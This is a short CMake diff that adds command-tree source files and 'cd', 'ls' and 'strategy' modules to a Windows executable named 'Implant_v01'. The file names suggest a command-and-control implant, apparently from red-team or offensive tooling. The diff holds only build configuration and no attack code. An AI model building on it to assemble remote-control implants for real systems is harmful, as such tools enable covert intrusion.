@@ -31,10 +31,12 @@ set(SOURCES
     "lifecycle/comms.cpp"
     "control/c2.h"
     "control/c2.cpp"
+    "control/commandtree.cpp"
+    "control/commandtree.h"
 
 )
 
-add_executable (Implant_v01 ${SOURCES})
+add_executable (Implant_v01 ${SOURCES} "modules/cd.cpp" "modules/cd.h" "modules/strategy.cpp" "modules/ls.cpp")
 
 # ==========================================
 # 3. Target Platform Logic (Windows)
